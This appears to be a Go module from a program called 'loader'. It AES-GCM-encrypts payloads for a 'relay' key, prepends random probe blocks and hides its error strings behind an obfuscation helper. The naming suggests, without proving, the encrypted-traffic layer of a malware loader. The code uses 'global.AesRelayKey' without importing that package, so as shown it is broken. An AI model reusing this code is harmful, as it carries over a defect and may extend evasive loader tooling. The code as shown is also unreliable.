package crypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"io"

	"loader/utils"
	"loader/utils/obf"
)

const (
	AesKeySize       = 32
	AesNonceSize     = 12
	AesTagSize       = 16
	AesProbePlainLen = 9
	AesProbeWireLen  = AesNonceSize + AesProbePlainLen + AesTagSize
)

func keyBytes(keyB64 string) ([]byte, error) {
	// Decodes the base64 aes key and checks that it has the expected length
	decoded, err := base64.StdEncoding.DecodeString(keyB64)
	if err != nil {
		return nil, err
	}
	if len(decoded) != AesKeySize {
		return nil, errors.New(obf.S("invalid aes key length"))
	}
	return decoded, nil
}

func aesEncrypt(key, plaintext []byte) ([]byte, error) {
	// Encrypts plaintext with the aes key and prepends a random nonce
	if len(key) != AesKeySize {
		return nil, errors.New(obf.S("aes key must be 32 bytes"))
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, AesNonceSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	out := gcm.Seal(nil, nonce, plaintext, nil)
	result := make([]byte, 0, len(nonce)+len(out))
	result = append(result, nonce...)
	result = append(result, out...)
	return result, nil
}

func aesDecrypt(key, blob []byte) ([]byte, error) {
	// Decrypts an aes blob by splitting the nonce from the ciphertext
	if len(key) != AesKeySize {
		return nil, errors.New(obf.S("aes key must be 32 bytes"))
	}
	overhead := AesNonceSize + AesTagSize
	if len(blob) < overhead {
		return nil, errors.New(obf.S("aes blob too short"))
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := blob[:AesNonceSize]
	ciphertext := blob[AesNonceSize:]
	plain, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plain, nil
}

func CryptEncryptKey(keyB64, plain string) string {
	// Encrypts a plain string with the given base64 aes key
	if plain == "" {
		return ""
	}
	key, err := keyBytes(keyB64)
	if err != nil {
		return ""
	}
	enc, err := aesEncrypt(key, []byte(plain))
	if err != nil {
		return ""
	}
	return string(enc)
}

func CryptEncryptWithProbe(keyB64, plain string) string {
	// Encrypts a random probe then the plain payload with the given aes key
	if plain == "" {
		return ""
	}
	key, err := keyBytes(keyB64)
	if err != nil {
		return ""
	}
	probe, err := obf.RandomProbe(AesProbePlainLen)
	if err != nil {
		return ""
	}
	encProbe, err := aesEncrypt(key, []byte(probe))
	if err != nil {
		return ""
	}
	encPayload, err := aesEncrypt(key, []byte(plain))
	if err != nil {
		return ""
	}
	out := string(encProbe) + string(encPayload)
	return out
}

func TryCryptDecrypt(keyB64, cipherText string) string {
	// Tries to decrypt ciphertext with the given base64 aes key
	if cipherText == "" {
		return ""
	}
	key, err := keyBytes(keyB64)
	if err != nil {
		return ""
	}
	plain, err := aesDecrypt(key, []byte(cipherText))
	if err != nil {
		return ""
	}
	return string(plain)
}

func AesRelayKeyFingerprint() string {
	// Builds a short fingerprint of the relay aes key
	key, err := keyBytes(global.AesRelayKey)
	if err != nil {
		return obf.S("badkey")
	}
	sum := md5.Sum(key)
	fp := hex.EncodeToString(sum[:])[:8]
	return fp
}

func CryptEncrypt(plain string) string {
	// Encrypts plain text with the relay aes key
	return CryptEncryptKey(global.AesRelayKey, plain)
}

func CryptDecrypt(cipherText string) string {
	// Decrypts ciphertext with the relay aes key
	return TryCryptDecrypt(global.AesRelayKey, cipherText)
}